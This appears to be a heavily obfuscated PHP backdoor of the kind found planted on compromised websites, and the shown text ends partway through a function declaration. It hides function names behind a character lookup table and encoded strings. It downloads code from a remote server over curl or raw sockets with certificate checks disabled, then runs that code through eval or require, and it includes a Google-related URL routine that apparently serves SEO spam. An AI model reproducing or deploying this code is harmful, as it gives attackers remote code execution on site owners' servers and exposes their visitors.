<?php
$x_yz_z_yyz=urldecode("%6f%41%2d%62%4e%6e%4b%37%4c%35%5f%4a%55%74%52%78%49%59%2b%57%43%61%39%33%56%6b%30%77%4d%31%4f%65%53%44%64%42%32%6a%2f%6c%73%58%66%71%70%68%6d%2a%54%47%76%51%48%72%50%79%63%5c%34%7a%75%46%36%69%5a%67%38%45");$xz_zyy_yz_=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[21].$x_yz_z_yyz[39].$x_yz_z_yyz[39].$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[25];$x_y__yzzyz=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[0].$x_yz_z_yyz[56].$x_yz_z_yyz[25].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[13];$xyz_zz__yy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[46].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[21].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[21];$xzzzy__yy_=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[3].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[56].$x_yz_z_yyz[25].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[65];$xzy__zy_zy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[46].$x_yz_z_yyz[31].$x_yz_z_yyz[0].$x_yz_z_yyz[60].$x_yz_z_yyz[13];$xz__yyy_zz=$x_yz_z_yyz[42].$x_yz_z_yyz[63].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$x__zz_yyzy=$x_yz_z_yyz[42].$x_yz_z_yyz[60].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[0].$x_yz_z_yyz[5].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[63].$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$x_zyyyz__z=$x_yz_z_yyz[31].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[0].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[0].$x_yz_z_yyz[53].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[65];$xzz__yz_yy=$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[45].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[3].$x_yz_z_yyz[55].$x_yz_z_yyz[5].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[31];$xy_z_zyy_z=$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[62].$x_yz_z_yyz[58].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$x_z_yyzyz_=$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[62].$x_yz_z_yyz[58].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[31].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy__yzyz_z=$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[27].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy_yz__yzz=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[31];$xyy__zz_yz=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[0].$x_yz_z_yyz[44].$x_yz_z_yyz[13];$xz_zyzyy__=$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[55].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[45].$x_yz_z_yyz[63].$x_yz_z_yyz[42].$x_yz_z_yyz[13];$xyy_yz__zz=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xzzzy_yy__=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[46].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[56].$x_yz_z_yyz[45];$x_yy_yz_zz=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[31];$x__yyzzz_y=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xz_y_zyzy_=$x_yz_z_yyz[44].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39];$xzyzyz___y=$x_yz_z_yyz[65].$x_yz_z_yyz[59].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[42].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[31];$x_y_yzyz_z=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xyy_zz_yz_=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[31].$x_yz_z_yyz[56];$xyzy_z_y_z=$x_yz_z_yyz[50].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[60].$x_yz_z_yyz[46].$x_yz_z_yyz[44];$xz_y__zyzy=$x_yz_z_yyz[63].$x_yz_z_yyz[40].$x_yz_z_yyz[10].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[55];$x___zzzyyy=$x_yz_z_yyz[13].$x_yz_z_yyz[46].$x_yz_z_yyz[44].$x_yz_z_yyz[42].$x_yz_z_yyz[63].$x_yz_z_yyz[39].$x_yz_z_yyz[31];$x_z_zyyzy_=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[53];$xyyz___zyz=$x_yz_z_yyz[63].$x_yz_z_yyz[46].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy_yyzzz__=$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xyy_zzyz__=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[44].$x_yz_z_yyz[0].$x_yz_z_yyz[40];$xz__zyy_zy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[5];$xyz__zyz_y=$x_yz_z_yyz[45].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[34].$x_yz_z_yyz[31].$x_yz_z_yyz[56];$x_y__yzzyz=$x_yz_z_yyz[42].$x_yz_z_yyz[27].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[13].$x_yz_z_yyz[31];$xzyyy_z_z_=$x_yz_z_yyz[42].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[31];$xz___yyzyz=$x_yz_z_yyz[42].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[34];$xy_y_yz_zz=$x_yz_z_yyz[42].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$xyz_z_yzy_=$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[60].$x_yz_z_yyz[5].$x_yz_z_yyz[13];$x_z_yzyyz_=$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[46];$xz_yzz__yy=$x_yz_z_yyz[37].$x_yz_z_yyz[0].$x_yz_z_yyz[63].$x_yz_z_yyz[5];$x_zy_y_zzy=$x_yz_z_yyz[42].$x_yz_z_yyz[31].$x_yz_z_yyz[0].$x_yz_z_yyz[42];${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x79\x79\x7a\x5f\x5f\x7a"](0);$xyyzz__zy_="Ha0RDcvo3LzVDMxUXLyYTMuIWeiFXZ0NmLpxmZU=";$x__yz_yzzy="Ha0RHc6MyLj9nLpdzYuU2Yt9wL==";function x_zz_z_yyy($xyz_yyz_z_){$x_zzy_y_yz=substr($xyz_yyz_z_,0,5);$xyzzyy__z_=substr($xyz_yyz_z_,-5);$x_zy_zyzy_=substr($xyz_yyz_z_,7,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xyz_yyz_z_)-14);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x7a\x79\x7a\x5f\x5f\x5f\x79"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"]($x_zzy_y_yz.$x_zy_zyzy_.$xyzzyy__z_));}function xy_zyyz__z($xz_zy__zyy){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x7a\x79\x5f\x79\x79\x5f\x5f"]("/^https*\\:\\/\\//si",$xz_zy__zyy)){return '500';}$xy_y_zzz_y=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x79\x79\x79\x5f\x7a\x7a"]($xz_zy__zyy);if($xy_y_zzz_y!=false){return $xy_y_zzz_y;}$x_yzz_z_yy=x_zz_z_yyy('Sy4typZonPzMss0U4GsYpTS/ILoOzUitTkmrTi/OTs/ILUvJoCBLO4pCg1MTcexE8tiU/OyUzNK6mB8YBknSJakA');$xy_zyzy__z=$xzyyz_y_z_=$xyzy_yz_z_=$xy_yy__zzzrr_str ='';foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('|',$x_yzz_z_yy) as $c){$xz_yz_y_yz=1;foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('+',$c) as $d){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x7a\x7a\x5f\x79\x79\x7a\x79"]($d)){$xz_yz_y_yz=0;}}unset($d);if($xz_yz_y_yz){$xy_zyzy__z=$c;break;}}unset($x_yzz_z_yy,$c);if($xy_zyzy__z==''){return 0;}if(substr($xy_zyzy__z,0,1)=='c'){$xyyz__yzz_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x79\x7a\x79\x7a\x5f\x7a"]();${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_URL,$xz_zy__zyy);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_USERAGENT,'s');${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_RETURNTRANSFER,1);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_TIMEOUT,100);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_FRESH_CONNECT,TRUE);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_SSL_VERIFYPEER,0);$xz_y_yz_yz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x5f\x79\x7a\x5f"]($xyyz__yzz_);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x79\x5f\x79\x7a\x5f\x7a\x7a"]($xyyz__yzz_);if(!$xz_y_yz_yz){return '501';}else{return $xz_y_yz_yz;}}$xz__yzyy_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x5f\x7a\x79\x7a\x79\x5f"]($xz_zy__zyy);isset($xz__yzyy_z["\x68\x6f\x73\x74"])||$xz__yzyy_z["\x68\x6f\x73\x74"]='';isset($xz__yzyy_z["\x70\x61\x74\x68"])||$xz__yzyy_z["\x70\x61\x74\x68"]='';isset($xz__yzyy_z["\x71\x75\x65\x72\x79"])|| $xz__yzyy_z["\x71\x75\x65\x72\x79"]='';isset($xz__yzyy_z["\x70\x6f\x72\x74"])||$xz__yzyy_z["\x70\x6f\x72\x74"]='';$x_zzy__yyz=$xz__yzyy_z["\x70\x61\x74\x68"]?$xz__yzyy_z["\x70\x61\x74\x68"].($xz__yzyy_z["\x71\x75\x65\x72\x79"]?'?'.$xz__yzyy_z["\x71\x75\x65\x72\x79"]:''):'/';$xzy_y__zzy=$xz__yzyy_z["\x68\x6f\x73\x74"];if($xz__yzyy_z["\x73\x63\x68\x65\x6d\x65"]=='https'){$xzz_y_zyy_='1.1';$x_zyyyz_z_=empty($xz__yzyy_z["\x70\x6f\x72\x74"])?443:$xz__yzyy_z["\x70\x6f\x72\x74"];$xzy_y__zzy=x_zz_z_yyy('Ky7OsPgdLABXBwA=');$xzy_y__zzy.=$xz__yzyy_z["\x68\x6f\x73\x74"];}else{$xzz_y_zyy_='1.0';$x_zyyyz_z_=empty($xz__yzyy_z["\x70\x6f\x72\x74"])?80:$xz__yzyy_z["\x70\x6f\x72\x74"];}$x_zzyyy_z_='Host:';$x_zzyyy_z_.=$xzy_y__zzy;$headers[]=$x_zzyyy_z_;$headers[]=x_zz_z_yyy('c87PymS0tNLsnMz7NyzskNivTgUA');$headers[]=x_zz_z_yyy('Cy1OLbCdJ1TE/NK7ErMqBgA=');$headers[]=x_zz_z_yyy('c0xOTXJi0osdLtWS1wIA');unset($x_zzyyy_z_);$xzyyz_y_z_="GET $x_zzy__yyz HTTP/$xzz_y_zyy_".PHP_EOL.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x7a\x7a\x5f\x5f\x79\x79"](PHP_EOL,$headers).PHP_EOL.PHP_EOL;unset($headers,$xz__yzyy_z,$xzz_y_zyy_,$x_zzy__yyz);$x_y_zz_yzy=null;if(substr($xy_zyzy__z,-1)=='n'){$x_y_zz_yzy=$xy_zyzy__z($xzy_y__zzy,$x_zyyyz_z_,$xyzy_yz_z_,$xy_yy__zzzrr_str,30);}else{if(substr($xy_zyzy__z,-1)=='t'){$xzzzyy__y_=x_zz_z_yyy('K0kusibNLVEXBwA=');$xzzzyy__y_.=$xzy_y__zzy;$xzzzyy__y_.=':';$xzzzyy__y_.=$x_zyyyz_z_;$x_y_zz_yzy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($xzzzyy__y_,$xyzy_yz_z_,$xy_yy__zzzrr_str,30);unset($xzzzyy__y_);}}$x_yy_z_zyz='';if($x_y_zz_yzy){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x7a\x79\x5f\x5f\x79\x79\x5f"]($x_y_zz_yzy,TRUE);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x5f\x5f\x7a\x79\x5f\x7a\x79"]($x_y_zz_yzy,30);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($x_y_zz_yzy,$xzyyz_y_z_);$x_z_y_yzyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x7a\x5f\x5f\x79\x79"]($x_y_zz_yzy);if(!$x_z_y_yzyz["\x74\x69\x6d\x65\x64\x5f\x6f\x75\x74"]){while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x5f\x79\x5f\x7a\x7a\x79"]($x_y_zz_yzy)){$xzyy__z_yz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x5f\x79\x7a\x5f\x7a\x7a"]($x_y_zz_yzy);if($xzyy__z_yz&&(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x5f\x79\x7a\x79\x7a\x5f\x7a"]($xzyy__z_yz)=="%0D%0A"||${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x5f\x79\x7a\x79\x7a\x5f\x7a"]($xzyy__z_yz)=="%0A")){break;}unset($xzyy__z_yz);}while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x5f\x79\x5f\x7a\x7a\x79"]($x_y_zz_yzy)){$xzz_y_yyz_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x5f\x79\x79\x7a\x79\x7a"]($x_y_zz_yzy,8192);$x_yy_z_zyz.=$xzz_y_yyz_;unset($xzz_y_yyz_);}}unset($x_z_y_yzyz);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x79\x79\x5f\x7a\x5f\x7a\x5f"]($x_y_zz_yzy);}else{if(substr($xy_zyzy__z,-1)=='e'){$x__zyzzy_y=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x5f\x5f\x79\x7a\x5f\x79\x79"]($xzy_y__zzy);$x_y_zz_yzy=$xy_zyzy__z(AF_INET,SOCK_STREAM,0);if(socket_connect($x_y_zz_yzy,$x__zyzzy_y,$x_zyyyz_z_)){socket_write($x_y_zz_yzy,$xzyyz_y_z_,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xzyyz_y_z_));while($x__yyz_yzz=@socket_read($x_y_zz_yzy,8192)){$x_yy_z_zyz.=$x__yyz_yzz;unset($x__yyz_yzz);}$x_yy_z_zyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]("\\r\\n\\r\\n",$x_yy_z_zyz);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x7a\x79\x7a\x79\x79\x5f\x5f"]($x_yy_z_zyz);$x_yy_z_zyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x7a\x5f\x5f\x5f\x7a\x79\x7a"]("\\r\\n\\r\\n",$x_yy_z_zyz);}socket_close($x_y_zz_yzy);unset($x__zyzzy_y);}}unset($xzyyz_y_z_,$xy_zyzy__z,$x_y_zz_yzy,$x_zyyyz_z_,$xzy_y__zzy);$x_yy_z_zyz=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x7a\x79\x79\x5f\x79\x7a\x5f"]('/(?:(?:\\r\\n|\\n)|^)([0-9A-F]+)(?:\\r\\n|\\n){1,2}(.*?)'.'((?:\\r\\n|\\n)(?:[0-9A-F]+(?:\\r\\n|\\n))|$)/si','x_zyzy_z_y',$x_yy_z_zyz);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"]($x_yy_z_zyz,"\\xEF\\xBB\\xBF"));}function x_zyzy_z_y($matches){return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x5f\x7a\x79\x7a\x5f\x79"]($matches[1])==${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($matches[2])?$matches[2]:$matches[0];}function xyzyz___zy($xzzyy_y__z=''){$xzzyy_y__z=(${"\x5f\x53\x45\x52\x56\x45\x52"}["HTTP_VIA"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["HTTP_X_FORWARDED_FOR"]:${"\x5f\x53\x45\x52\x56\x45\x52"}["REMOTE_ADDR"];$xzzyy_y__z=($xzzyy_y__z)?$xzzyy_y__z:${"\x5f\x53\x45\x52\x56\x45\x52"}["REMOTE_ADDR"];return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"]($xzzyy_y__z);}function xzyy_y_zz_($xyz_yyz_z_=''){if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"])){return ${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"];}elseif(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"])){return ${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"];}return $xyz_yyz_z_;}function xz_zy_zyy_($xz_zy__zyy){$xzyyz__y_z=xy_zyyz__z($xz_zy__zyy);$xzz_yy__zy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"]("PD9waHA=");if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x79\x7a\x5f\x5f"]($xzyyz__y_z,$xzz_yy__zy)===false){die('get failed');}$xyyzyz_z__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x5f\x7a\x7a\x7a\x79\x79\x79"]();if(isset($_REQUEST["\x65"])){$xzyyz__y_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x7a\x5f\x5f\x79\x7a\x7a"]($xzz_yy__zy,"",$xzyyz__y_z);$xy_yy__zzz='e'.'v'.'a'.'l';$xy_yy__zzz($xzyyz__y_z);die();}${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($xyyzyz_z__,$xzyyz__y_z);$x_yzz_z_yy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x7a\x5f\x5f\x79\x79"]($xyyzyz_z__);@require($x_yzz_z_yy["\x75\x72\x69"]);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x79\x79\x5f\x7a\x5f\x7a\x5f"]($xyyzyz_z__);die();}function x__yzy_yzz($xyyzz__zy_){$x_yzz_y_zy=substr($xyyzz__zy_,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xyyzz__zy_) -2);$xyzy__zy_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x79\x79\x7a\x7a\x7a\x5f\x79"]($xyyzz__zy_);$xzzy__yzy_='';for ($xy_zzyy__z=0;$xy_zzyy__z<${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x5f\x79\x7a\x79\x5f"]($xyzy__zy_z)-2;$xy_zzyy__z=$xy_zzyy__z+2){$xzzy__yzy_.=$xyzy__zy_z[$xy_zzyy__z+1].$xyzy__zy_z[$xy_zzyy__z];}$xzzy__yzy_.=$x_yzz_y_zy;return $xzzy__yzy_;}function x_z_zyyyz_($googleUrl,$x__yzz_yzy,$xy_z_zyz_y){$x_z__yzzyy=x_zz_z_yyy('yygpKPrSi20tdXLdYvyMxLty/OLEnNTSywVS0GiqgBLWAwA=');$x_y__zzyzy=sprintf($x_z__yzzyy,$googleUrl,$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"],$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"],$x__yzz_yzy);$xyy_z__zyz=xy_zyyz__z($x_y__zzyzy);if(isset($_REQUEST["\x73\x74"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_y__zzyzy);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($xyy_z__zyz);die();}$xzyyyz_z__=x_zz_z_yyy('S8/PTCz89ZcJBQA=');$x_y_yzzzy_=x_zz_z_yyy('Ky5NToUk4iBtLgYA');$xyyzyz__z_=x_zz_z_yyy('S0vMzEJElwPNAQA=');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x79\x7a\x5f\x5f"]($xyy_z__zyz,$xzyyyz_z__)!=false){die($x_y_yzzzy_);}die($xyyzyz__z_);}function 